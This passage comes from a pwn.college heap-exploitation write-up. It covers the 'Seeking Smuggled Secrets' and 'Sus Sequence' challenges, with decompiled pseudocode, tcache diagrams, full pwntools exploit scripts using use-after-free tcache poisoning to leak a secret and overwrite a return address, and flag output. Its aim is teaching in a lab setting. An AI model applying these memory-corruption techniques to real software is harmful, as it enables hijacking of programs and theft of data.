Nothing zeroes `entries[idx]` when the count reaches 0. If the popped chunk was `secret_addr`, then `entries[idx]` now holds `*(secret_addr)`, which is `secret[:8]`. The `print_TCACHE` helper iterates `count` times from `entries[idx]`, so when count is 0 the loop body never runs and the head displays as `(nil)`. The display layer hides it, but the raw memory still holds the secret bytes.

The next time we `free` a chunk of the same size class, `TCACHE_put` runs:

```c
e->next = PROTECT_PTR(&e->next, TCACHE->entries[tc_idx]);
TCACHE->entries[tc_idx] = e;
++(TCACHE->counts[tc_idx]);
```

The new chunk's `next` is set to whatever is currently in `entries[idx]`, with no validation. The stale secret bytes get copied straight into the freed chunk's first 8 bytes, where `puts` can read them.

**Step 1: Allocate two chunks and free them**

As long as we allocate on the real heap (far above the secret address), the guard check passes and we get our chunks normally.

```
free(1), free(0)


┌┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┐
┊  TCACHE_perthread_struct Void                                        ┊
┊            ┏━━━━━━━━━━━━━━━━┳━━━━━━━━━━━━━━━━┳━━━━━━━━━━━━━━━━┓      ┊
┊    counts: ┃ count_128: 2   ┃ count_32: 0    ┃ count_48: 0    ┃ ...  ┊
┊            ┣━━━━━━━━━━━━━━━━╋━━━━━━━━━━━━━━━━╋━━━━━━━━━━━━━━━━┫      ┊
┊   entries: ┃ entry_128: &A  ┃ entry_32: NULL ┃ entry_48: NULL ┃ ...  ┊
┊            ┗━━━━━━━━━━━━━━━━┻━━━━━━━━━━━━━━━━┻━━━━━━━━━━━━━━━━┛      ┊
└┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄│┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┘
                         │
         ╭───────────────╯
         │
         v
┌┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┐
┆  TCACHE_entry A  ┆
├──────────────────┤
│    next: &B      │────╮
├──────────────────┤    │
│    key: Void     │    │
└──────────────────┘    │
                        │
        ╭───────────────╯
        │
        v
┌┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┐
┆  TCACHE_entry B  ┆
├──────────────────┤
│    next: NULL    │
├──────────────────┤
│    key: Void     │
└──────────────────┘
```

**Step 2: Poison chunk `A`'s next pointer to `secret_addr`**

Since `ptr[0]` is a dangling pointer to chunk A, `scanf` lets us write directly into the freed chunk's memory. The first 8 bytes of a freed chunk are its `next` pointer, so we overwrite it with `secret_addr`. Chunk B is now orphaned.

```c title="/challenge/seeking-smuggled-secrets-easy :: main() :: Pseudocode" showLineNumbers
# ---- snip ----

if ( (unsigned int)malloc_usable_size(ptr[v10]) )
{
  v3 = malloc_usable_size(ptr[v10]);
  sprintf(choice, "%%%us", v3);
  __isoc99_scanf(choice, ptr[v10]);  // writes p64(secret_addr) into chunk A's next field
}

# ---- snip ----
```

```
scanf(0, p64(secret_addr))


┌┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┐
┊  TCACHE_perthread_struct Void                                        ┊
┊            ┏━━━━━━━━━━━━━━━━┳━━━━━━━━━━━━━━━━┳━━━━━━━━━━━━━━━━┓      ┊
┊    counts: ┃ count_128: 2   ┃ count_32: 0    ┃ count_48: 0    ┃ ...  ┊
┊            ┣━━━━━━━━━━━━━━━━╋━━━━━━━━━━━━━━━━╋━━━━━━━━━━━━━━━━┫      ┊
┊   entries: ┃ entry_128: &A  ┃ entry_32: NULL ┃ entry_48: NULL ┃ ...  ┊
┊            ┗━━━━━━━━━━━━━━━━┻━━━━━━━━━━━━━━━━┻━━━━━━━━━━━━━━━━┛      ┊
└┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄│┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┘
                         │
         ╭───────────────╯
         │
         v
┌┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┐
┆  TCACHE_entry A  ┆
├──────────────────┤
│ next: &SECRET    │────╮   (B is now orphaned)
├──────────────────┤    │
│    key: Void     │    │
└──────────────────┘    │
                        │
        ╭───────────────╯
        │
        v
┌┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┐
┆  DATA SEGMENT (secret_addr)      ┆
├──────────────────────────────────┤
│  next: secret[:8]  "lbaaifox"    │
├──────────────────────────────────┤
│  key:  secret[8:16] "clsnrpaf"   │
└──────────────────────────────────┘
```

**Step 3: `malloc` twice, second one gets discarded**

The first `malloc` pops chunk A normally. It is a real heap address, the guard passes. The second `malloc` pops `secret_addr` and advances the TCACHE's `entries[idx]` field to `*(secret_addr)`, which is `secret[:8]`. Then the guard fires and nullifies `ptr[1]`. The pointer is gone, but the stale `secret[:8]` value is now sitting in `entries[idx]`.

```c title="/challenge/seeking-smuggled-secrets-easy :: main() :: Pseudocode" showLineNumbers
# ---- snip ----

ptr[v7] = malloc(size);              // pops secret_addr; entries[idx] = secret[:8]
if ( ptr[v7] >= (char *)&secret + 65536 )
{
  printf("[*] allocations[%d] = %p\n", v7, ptr[v7]);
}
else
{
  puts("Invalid allocation detected: discarded!");
  ptr[v7] = 0LL;                     // too late, entries[idx] already advanced
}

# ---- snip ----
```

```
malloc(0) -> ptr[0] = &A  (real heap, passes guard)
malloc(1) -> ptr[1] = NULL (secret_addr discarded by guard)
            but entries[128] (raw memory) = secret[:8]
            count[128] = 0, so displayed as NULL



┌┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┐
┊  TCACHE_perthread_struct Void                                               ┊
┊            ┏━━━━━━━━━━━━━━━━━━━━━━━┳━━━━━━━━━━━━━━━━┳━━━━━━━━━━━━━━━━┓      ┊
┊    counts: ┃ count_128: 0          ┃ count_32: 0    ┃ count_48: 0    ┃ ...  ┊
┊            ┣━━━━━━━━━━━━━━━━━━━━━━━╋━━━━━━━━━━━━━━━━╋━━━━━━━━━━━━━━━━┫      ┊
┊   entries: ┃ entry_128: secret[:8] ┃ entry_32: NULL ┃ entry_48: NULL ┃ ...  ┊
┊            ┗━━━━━━━━━━━━━━━━━━━━━━━┻━━━━━━━━━━━━━━━━┻━━━━━━━━━━━━━━━━┛      ┊
└┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┘


┌┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┐
┆  TCACHE_entry A  ┆
├──────────────────┤
│ next: &SECRET    │
├──────────────────┤    
│    key: Void     │    
└──────────────────┘    
                           
        
┌┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┐
┆  DATA SEGMENT (secret_addr)      ┆
├──────────────────────────────────┤
│  next: secret[:8]  "lbaaifox"    │
├──────────────────────────────────┤
│  key:  secret[8:16] "clsnrpaf"   │
└──────────────────────────────────┘
```

The key insight is that `entries[128]` and `counts[128]` are independent. The display reads `counts[128] == 0` and renders the head as `(nil)`, but the underlying 8 bytes at `entries[128]` were never cleared. They still hold `secret[:8]`.

**Step 4: Free chunk `A`, its next gets set to the stale entries value**

When we `free(0)`, `TCACHE_put` inserts chunk A at the front of the bin. The insertion sets chunk A's `next` to the **current value** at `entries[128]`, which is the stale `secret[:8]` from step 3. There is no check that this value is a valid pointer, it is just copied verbatim.

```
free(0)


┌┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┐
┊  TCACHE_perthread_struct Void                                        ┊
┊            ┏━━━━━━━━━━━━━━━━┓                                        ┊
┊    counts: ┃ count_128: 1   ┃                                        ┊
┊            ┣━━━━━━━━━━━━━━━━┫                                        ┊
┊   entries: ┃ entry_128: &A  ┃                                        ┊
┊            ┗━━━━━━━━━━━━━━━━┛                                        ┊
└┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄│┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┘
                         │
         ╭───────────────╯
         │
         v
┌┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┐
┆  TCACHE_entry A  ┆ <── ptr[0] still points here (dangling)
├──────────────────┤
│ next: "lbaaifox" │ <── secret bytes smuggled in from stale entries
├──────────────────┤
│    key: Void     │
└──────────────────┘
```

**Step 5: `puts` leaks the secret**

`ptr[0]` still points to chunk A because `free` never clears the pointer. When we call `puts(0)`, the program reads from chunk A's memory. The very first bytes of chunk A are its `next` field, which now holds the secret bytes.

```c title="/challenge/seeking-smuggled-secrets-easy :: main() :: Pseudocode" showLineNumbers
# ---- snip ----

printf("Data: ");
puts((const char *)ptr[v9]);   // ptr[0] = &A, reads from A's next field = "lbaaifox"

# ---- snip ----
```

Since the secret is 16 bytes and each round only leaks 8, we run the whole trick twice, once targeting `secret_addr` and once targeting `secret_addr + 8`.

### Exploit

```python title="~/script.py" showLineNumbers
from pwn import *

p = process("/challenge/seeking-smuggled-secrets-easy", level='error')

p.recvuntil(b"secret stored at ")
secret_addr = int(p.recvuntil(b".").strip(b".").decode(), 16)
print(f"[*] Secret at: {hex(secret_addr)}")

def malloc(idx, size):
    p.sendline(b"malloc")
    p.sendline(str(idx).encode())
    p.sendline(str(size).encode())
    p.recvuntil(b"quit):")

def free(idx):
    p.sendline(b"free")
    p.sendline(str(idx).encode())
    p.recvuntil(b"quit):")

def scanf(idx, data):
    p.sendline(b"scanf")
    p.sendline(str(idx).encode())
    p.sendline(data)
    p.recvuntil(b"quit):")

def puts(idx):
    p.sendline(b"puts")
    p.sendline(str(idx).encode())
    p.recvuntil(b"Data: ")
    return p.recvline().strip()

def leak_8_bytes(target):
    malloc(0, 128)
    malloc(1, 128)
    free(1)
    free(0)
    scanf(0, p64(target))
    malloc(0, 128)
    malloc(1, 128)  # discarded, entries[128] = secret bytes at target
    free(0)         # chunk 0's next = stale entries = secret bytes
    return puts(0).ljust(8, b"\x00")[:8]

part1 = leak_8_bytes(secret_addr)
print(f"[*] Part 1: {part1}")

part2 = leak_8_bytes(secret_addr + 8)
print(f"[*] Part 2: {part2}")

secret = part1 + part2
print(f"[*] Full secret: {secret}")

p.sendline(b"send_flag")
p.sendline(secret)
print(p.recvuntil(b"}").decode())
```

```
hacker@dynamic-allocator-misuse~seeking-smuggled-secrets-easy:/$ python ~/script.py 
[*] Secret at: 0x429360
[*] Part 1: b'lbaaifox'
[*] Part 2: b'\x00\x00\x00\x00\x00\x00\x00\x00'
[*] Full secret: b'lbaaifox\x00\x00\x00\x00\x00\x00\x00\x00'
+====================+========================+==============+============================+============================+
| TCACHE BIN #7      | SIZE: 121 - 136        | COUNT: 1     | HEAD: 0x340a82c0           | KEY: 0x340a8010            |
+====================+========================+==============+============================+============================+
| ADDRESS             | PREV_SIZE (-0x10)   | SIZE (-0x08)                 | next (+0x00)        | key (+0x08)         |
+---------------------+---------------------+------------------------------+---------------------+---------------------+
| 0x340a82c0          | 0                   | 0x91 (P)                     | (nil)               | 0x340a8010          |
+----------------------------------------------------------------------------------------------------------------------+


[*] Function (malloc/free/puts/scanf/send_flag/quit): 
Secret: 
Authorized!
You win! Here is your flag:
pwn.college{AjaluoGkR43La3HVPhxUDXQhPZk.01N4MDL4ITM0EzW}
```

&nbsp;

## Seeking Smuggled Secrets (Hard)

```
hacker@dynamic-allocator-misuse~seeking-smuggled-secrets-hard:/$ /challenge/seeking-smuggled-secrets-hard
###
### Welcome to /challenge/seeking-smuggled-secrets-hard!
###


[*] Function (malloc/free/puts/scanf/send_flag/quit):
```

### Binary Analysis

```c title="/challenge/seeking-smuggled-secrets-hard :: main() :: Pseudocode" showLineNumbers
int __fastcall main(int argc, const char **argv, const char **envp)
{
  int v3; // eax
  int i; // [rsp+2Ch] [rbp-124h]
  unsigned int v6; // [rsp+30h] [rbp-120h]
  unsigned int v7; // [rsp+30h] [rbp-120h]
  unsigned int v8; // [rsp+30h] [rbp-120h]
  unsigned int v9; // [rsp+30h] [rbp-120h]
  unsigned int size; // [rsp+34h] [rbp-11Ch]
  void *ptr[16]; // [rsp+40h] [rbp-110h] BYREF
  char s1[136]; // [rsp+C0h] [rbp-90h] BYREF
  unsigned __int64 v13; // [rsp+148h] [rbp-8h]

  v13 = __readfsqword(0x28u);
  setvbuf(stdin, nullptr, 2, 0);
  setvbuf(stdout, nullptr, 2, 1u);
  puts("###");
  printf("### Welcome to %s!\n", *argv);
  puts("###");
  putchar(10);
  memset(ptr, 0, sizeof(ptr));
  for ( i = 0; i <= 15; ++i )
    byte_428363[i] = rand() % 26 + 97;
  while ( 1 )
  {
    while ( 1 )
    {
      while ( 1 )
      {
        while ( 1 )
        {
          while ( 1 )
          {
            puts(byte_40214C);
            printf("[*] Function (malloc/free/puts/scanf/send_flag/quit): ");
            __isoc99_scanf("%127s", s1);
            puts(byte_40214C);
            if ( strcmp(s1, "malloc") )
              break;
            printf("Index: ");
            __isoc99_scanf("%127s", s1);
            puts(byte_40214C);
            v6 = atoi(s1);
            if ( v6 > 0xF )
              __assert_fail("allocation_index < 16", "<stdin>", 0x72u, "main");
            printf("Size: ");
            __isoc99_scanf("%127s", s1);
            puts(byte_40214C);
            size = atoi(s1);
            ptr[v6] = malloc(size);
            if ( ptr[v6] < (char *)&secret + 0x10000 )
            {
              puts("Invalid allocation detected: discarded!");
              ptr[v6] = nullptr;
            }
          }
          if ( strcmp(s1, "free") )
            break;
          printf("Index: ");
          __isoc99_scanf("%127s", s1);
          puts(byte_40214C);
          v7 = atoi(s1);
          if ( v7 > 0xF )
            __assert_fail("allocation_index < 16", "<stdin>", 0x88u, "main");
          free(ptr[v7]);
        }
        if ( strcmp(s1, "puts") )
          break;
        printf("Index: ");
        __isoc99_scanf("%127s", s1);
        puts(byte_40214C);
        v8 = atoi(s1);
        if ( v8 > 0xF )
          __assert_fail("allocation_index < 16", "<stdin>", 0x94u, "main");
        printf("Data: ");
        puts((const char *)ptr[v8]);
      }
      if ( strcmp(s1, "scanf") )
        break;
      printf("Index: ");
      __isoc99_scanf("%127s", s1);
      puts(byte_40214C);
      v9 = atoi(s1);
      if ( v9 > 0xF )
        __assert_fail("allocation_index < 16", "<stdin>", 0xA0u, "main");
      if ( (unsigned int)malloc_usable_size(ptr[v9]) )
      {
        v3 = malloc_usable_size(ptr[v9]);
        sprintf(s1, "%%%us", v3);
        __isoc99_scanf(s1, ptr[v9]);
        puts(byte_40214C);
      }
    }
    if ( strcmp(s1, "send_flag") )
      break;
    printf("Secret: ");
    __isoc99_scanf("%127s", s1);
    puts(byte_40214C);
    if ( !memcmp(s1, byte_428363, 0x10u) )
    {
      puts("Authorized!");
      win();
    }
    else
    {
      puts("Not authorized!");
    }
  }
  if ( strcmp(s1, "quit") )
    puts("Unrecognized choice!");
  puts("### Goodbye!");
  return 0;
}
```

The solution is the same as the easy version. The only difference is that the secret address is not printed, we have to find it from the binary. From the decompiled code we can see it is stored at `byte_428363`.

### Exploit

```python title="~/script.py" showLineNumbers
from pwn import *

p = process("/challenge/seeking-smuggled-secrets-hard", level='error')

secret_addr = 0x428363

def malloc(idx, size):
    p.sendline(b"malloc")
    p.sendline(str(idx).encode())
    p.sendline(str(size).encode())
    p.recvuntil(b"quit):")

def free(idx):
    p.sendline(b"free")
    p.sendline(str(idx).encode())
    p.recvuntil(b"quit):")

def scanf(idx, data):
    p.sendline(b"scanf")
    p.sendline(str(idx).encode())
    p.sendline(data)
    p.recvuntil(b"quit):")

def puts(idx):
    p.sendline(b"puts")
    p.sendline(str(idx).encode())
    p.recvuntil(b"Data: ")
    return p.recvline().strip()

def leak_8_bytes(target):
    malloc(0, 128)
    malloc(1, 128)
    free(1)
    free(0)
    scanf(0, p64(target))
    malloc(0, 128)
    malloc(1, 128)  # discarded, TCACHE HEAD = secret bytes at target
    free(0)         # chunk 0's next = secret bytes
    return puts(0).ljust(8, b"\x00")[:8]

part1 = leak_8_bytes(secret_addr)
print(f"[*] Part 1: {part1}")

part2 = leak_8_bytes(secret_addr + 8)
print(f"[*] Part 2: {part2}")

secret = part1 + part2
print(f"[*] Full secret: {secret}")

p.sendline(b"send_flag")
p.sendline(secret)
print(p.recvuntil(b"}").decode())
```

```
hacker@dynamic-allocator-misuse~seeking-smuggled-secrets-hard:/$ python ~/script.py 
[*] Part 1: b'lbakkspw'
[*] Part 2: b'\x00\x00\x00\x00\x00\x00\x00\x00'
[*] Full secret: b'lbakkspw\x00\x00\x00\x00\x00\x00\x00\x00'

[*] Function (malloc/free/puts/scanf/send_flag/quit): 
Secret: 
Authorized!
You win! Here is your flag:
pwn.college{gxDmBbJG8bH762oJ03Nd3hoHtpp.0FO4MDL4ITM0EzW}
```

&nbsp;

## Sus Sequence (Easy)

```
hacker@dynamic-allocator-misuse~sus-sequence-easy:/$ /challenge/sus-sequence-easy
###
### Welcome to /challenge/sus-sequence-easy!
###

This challenge allows you to perform various heap operations, some of which may involve the flag. Through this series of
challenges, you will become familiar with the concept of heap exploitation.

This challenge can manage up to 16 unique allocations.

[LEAK] The local stack address of your allocations is at: 0x7ffc49649960.

[LEAK] The address of main is at: 0x63f7b05b8afd.


[*] Function (malloc/free/puts/scanf/quit):
```

### Binary Analysis

```c title="/challenge/sus-sequence-easy :: main() :: Pseudocode" showLineNumbers
int __fastcall main(int argc, const char **argv, const char **envp)
{
  int v3; // eax
  int v4; // eax
  unsigned int v6; // [rsp+20h] [rbp-120h]
  unsigned int v7; // [rsp+20h] [rbp-120h]
  unsigned int v8; // [rsp+20h] [rbp-120h]
  unsigned int v9; // [rsp+20h] [rbp-120h]
  unsigned int size; // [rsp+24h] [rbp-11Ch]
  void *ptr[16]; // [rsp+30h] [rbp-110h] BYREF
  char s1[136]; // [rsp+B0h] [rbp-90h] BYREF
  unsigned __int64 v13; // [rsp+138h] [rbp-8h]

  v13 = __readfsqword(0x28u);
  setvbuf(stdin, nullptr, 2, 0);
  setvbuf(stdout, nullptr, 2, 1u);
  puts("###");
  printf("### Welcome to %s!\n", *argv);
  puts("###");
  putchar(10);
  memset(ptr, 0, sizeof(ptr));
  puts(
    "This challenge allows you to perform various heap operations, some of which may involve the flag. Through this series of");
  puts("challenges, you will become familiar with the concept of heap exploitation.\n");
  printf("This challenge can manage up to %d unique allocations.\n\n", 16);
  printf("[LEAK] The local stack address of your allocations is at: %p.\n\n", ptr);
  printf("[LEAK] The address of main is at: %p.\n\n", main);
  while ( 1 )
  {
    while ( 1 )
    {
      while ( 1 )
      {
        while ( 1 )
        {
          print_TCACHE(main_thread_TCACHE);
          puts(byte_3588);
          printf("[*] Function (malloc/free/puts/scanf/quit): ");
          __isoc99_scanf("%127s", s1);
          puts(byte_3588);
          if ( strcmp(s1, "malloc") )
            break;
          printf("Index: ");
          __isoc99_scanf("%127s", s1);
          puts(byte_3588);
          v6 = atoi(s1);
          if ( v6 > 0xF )
            __assert_fail("allocation_index < 16", "<stdin>", 0xFEu, "main");
          printf("Size: ");
          __isoc99_scanf("%127s", s1);
          puts(byte_3588);
          size = atoi(s1);
          printf("[*] allocations[%d] = malloc(%d)\n", v6, size);
          ptr[v6] = malloc(size);
          printf("[*] allocations[%d] = %p\n", v6, ptr[v6]);
        }
        if ( strcmp(s1, "free") )
          break;
        printf("Index: ");
        __isoc99_scanf("%127s", s1);
        puts(byte_3588);
        v7 = atoi(s1);
        if ( v7 > 0xF )
          __assert_fail("allocation_index < 16", "<stdin>", 0x110u, "main");
        printf("[*] free(allocations[%d])\n", v7);
        free(ptr[v7]);
      }
      if ( strcmp(s1, "puts") )
        break;
      printf("Index: ");
      __isoc99_scanf("%127s", s1);
      puts(byte_3588);
      v8 = atoi(s1);
      if ( v8 > 0xF )
        __assert_fail("allocation_index < 16", "<stdin>", 0x11Du, "main");
      printf("[*] puts(allocations[%d])\n", v8);
      printf("Data: ");
      puts((const char *)ptr[v8]);
    }
    if ( strcmp(s1, "scanf") )
      break;
    printf("Index: ");
    __isoc99_scanf("%127s", s1);
    puts(byte_3588);
    v9 = atoi(s1);
    if ( v9 > 0xF )
      __assert_fail("allocation_index < 16", "<stdin>", 0x12Au, "main");
    v3 = malloc_usable_size(ptr[v9]);
    sprintf(s1, "%%%us", v3);
    v4 = malloc_usable_size(ptr[v9]);
    printf("[*] scanf(\"%%%us\", allocations[%d])\n", v4, v9);
    __isoc99_scanf(s1, ptr[v9]);
    puts(byte_3588);
  }
  if ( strcmp(s1, "quit") )
    puts("Unrecognized choice!");
  puts("### Goodbye!");
  return 0;
}
```

This challenge provides two leaks and has no `send_flag` or `read_flag`. The goal is to gain control flow by calling `win()`.

The two leaks give us everything we need:

- `ptr` is the address of the `ptr[]` array on the stack. `main()`'s return address lives at a fixed offset from it, calculable from the stack layout in the pseudocode. `ptr` is at `[rbp-110h]` and the return address is at `[rbp+8]`, so the offset from `ptr` to the return address is `0x110 + 8 = 0x118`.
- `main()`'s address lets us calculate `win()`'s address at runtime since both live in the same binary at fixed offsets.

### Finding `win()`

```
hacker@dynamic-allocator-misuse~sus-sequence-easy:/$ nm /challenge/sus-sequence-easy | grep -E "main|win"
0000000000001afd T main
0000000000005048 B main_thread_TCACHE
0000000000001a00 T win
```

`win()` is at offset `0x1a00` and `main()` is at `0x1afd`, so:

```
win_addr = leaked_main_addr - 0xfd
```

### Tcache Poisoning to Overwrite the Return Address

The program has no secret to leak and no authorization check. The only way out is to make `main()` return to `win()` instead of back to `__libc_start_main()`. We do this by poisoning the TCACHE to hand us a pointer directly onto the stack, at `main()`'s return address, and then writing `win_addr` there with `scanf`.

We allocate two chunks, free them to populate the TCACHE, then use `scanf` on the dangling pointer to overwrite chunk A's `next` with the return address on the stack:

```
┌┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┐
┊  TCACHE_perthread_struct Void                                        ┊
┊            ┏━━━━━━━━━━━━━━━━┳━━━━━━━━━━━━━━━━┓                       ┊
┊    counts: ┃ count_128: 2   ┃ count_32: 0    ┃  ...                  ┊
┊            ┣━━━━━━━━━━━━━━━━╋━━━━━━━━━━━━━━━━┫                       ┊
┊   entries: ┃ entry_128: &A  ┃ entry_32: NULL ┃  ...                  ┊
┊            ┗━━━━━━━━━━━━━━━━┻━━━━━━━━━━━━━━━━┛                       ┊
└┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄│┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┘
                         │
         ╭───────────────╯
         │
         v
┌┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┐
┆  TCACHE_entry A  ┆
├──────────────────┤
│  next: ret_addr  │ ────╮   (poisoned via scanf on dangling ptr[0])
├──────────────────┤     │
│    key: Void     │     │
└──────────────────┘     │
                         │
         ╭───────────────╯
         │
         v
┌┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┐
┆  STACK (ret_addr)        ┆
├──────────────────────────┤
│  return address of main  │
└──────────────────────────┘
```

Now we `malloc` twice. The first allocation returns chunk A (real heap, harmless). The second pops `ret_addr` from the TCACHE, giving us `ptr[1]` pointing directly at `main()`'s return address on the stack:

```
┌┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┐
┊  TCACHE_perthread_struct Void                                               ┊
┊            ┏━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┳━━━━━━━━━━━━━━━━┓                ┊
┊    counts: ┃ count_128: 0                 ┃ count_32: 0    ┃  ...           ┊
┊            ┣━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━╋━━━━━━━━━━━━━━━━┫                ┊
┊   entries: ┃ entry_128: *(ret_addr)       ┃ entry_32: NULL ┃  ...           ┊
┊            ┗━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┻━━━━━━━━━━━━━━━━┛                ┊
└┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┘


┌┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┐
┆  TCACHE_entry A  ┆  (ptr[0], allocated normally)
├──────────────────┤
│  ..............  │
├──────────────────┤
│       NULL       │
└──────────────────┘


┌┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┐
┆  STACK (ret_addr)        ┆  (ptr[1], points at main's return address)
├──────────────────────────┤
│  return address of main  │
└──────────────────────────┘
```

We then call `scanf` on `ptr[1]` and write `win_addr` into it. When we type `quit`, `main()` returns and jumps to `win()` instead of back to libc.

### Exploit

```python title="~/script.py" showLineNumbers
from pwn import *

p = process("/challenge/sus-sequence-easy", level='error')

p.recvuntil(b"allocations is at: ")
ptr_addr = int(p.recvuntil(b".").strip(b"."), 16)
p.recvuntil(b"main is at: ")
main_addr = int(p.recvuntil(b".").strip(b"."), 16)

win_addr = main_addr - 0xfd
ret_addr = ptr_addr + 0x118

print(f"[*] ptr:  {hex(ptr_addr)}")
print(f"[*] main: {hex(main_addr)}")
print(f"[*] win:  {hex(win_addr)}")
print(f"[*] ret:  {hex(ret_addr)}")

def malloc(idx, size):
    p.sendline(b"malloc")
    p.sendline(str(idx).encode())
    p.sendline(str(size).encode())
    p.recvuntil(b"quit): ")

def free(idx):
    p.sendline(b"free")
    p.sendline(str(idx).encode())
    p.recvuntil(b"quit): ")

def scanf(idx, data):
    p.sendline(b"scanf")
    p.sendline(str(idx).encode())
    p.sendline(data)
    p.recvuntil(b"quit): ")

malloc(0, 128)
malloc(1, 128)
free(1)
free(0)
scanf(0, p64(ret_addr))
malloc(0, 128)
malloc(1, 128)
scanf(1, p64(win_addr))

p.sendline(b"quit")
print(p.recvall().decode())
```

```
hacker@dynamic-allocator-misuse~sus-sequence-easy:/$ python ~/script.py 
[*] ptr:  0x7ffc49649960
[*] main: 0x63f7b05b8afd
[*] win:  0x63f7b05b8a00
[*] ret:  0x7ffc49649a78

Index: 
[*] scanf("%0s", allocations[1])


[*] Function (malloc/free/puts/scanf/quit): 
### Goodbye!
You win! Here is your flag:
pwn.college{88twOvG52sbTbuMId3_XJu4ZfiL.0VO4MDL4ITM0EzW}
```

&nbsp;

## Sus Sequence (Hard)

```
hacker@dynamic-allocator-misuse~sus-sequence-hard:/$ /challenge/sus-sequence-hard
###
### Welcome to /challenge/sus-sequence-hard!
###

[LEAK] The local stack address of your allocations is at: 0x7fff7069def0.

[LEAK] The address of main is at: 0x558e484684fd.


[*] Function (malloc/free/puts/scanf/quit):
```

The solution is the same as the [easy version](#sus-sequence-easy). The only differences are that there is no `print_TCACHE` display, and we have to find the offset between `main()` and `win()` from the binary ourselves.

### Binary Analysis

```c title="/challenge/sus-sequence-hard :: main() :: Pseudocode" showLineNumbers
int __fastcall main(int argc, const char **argv, const char **envp)
{
  int v3; // eax
  unsigned int v5; // [rsp+20h] [rbp-120h]
  unsigned int v6; // [rsp+20h] [rbp-120h]
  unsigned int v7; // [rsp+20h] [rbp-120h]
  unsigned int v8; // [rsp+20h] [rbp-120h]
  unsigned int size; // [rsp+24h] [rbp-11Ch]
  void *ptr[16]; // [rsp+30h] [rbp-110h] BYREF
  char s1[136]; // [rsp+B0h] [rbp-90h] BYREF
  unsigned __int64 v12; // [rsp+138h] [rbp-8h]

  v12 = __readfsqword(0x28u);
  setvbuf(stdin, nullptr, 2, 0);
  setvbuf(stdout, nullptr, 2, 1u);
  // ...
  printf("[LEAK] The local stack address of your allocations is at: %p.\n\n", ptr);
  printf("[LEAK] The address of main is at: %p.\n\n", main);
  // ...
}
```

```
hacker@dynamic-allocator-misuse~sus-sequence-hard:/$ nm /challenge/sus-sequence-hard | grep -E "main|win"
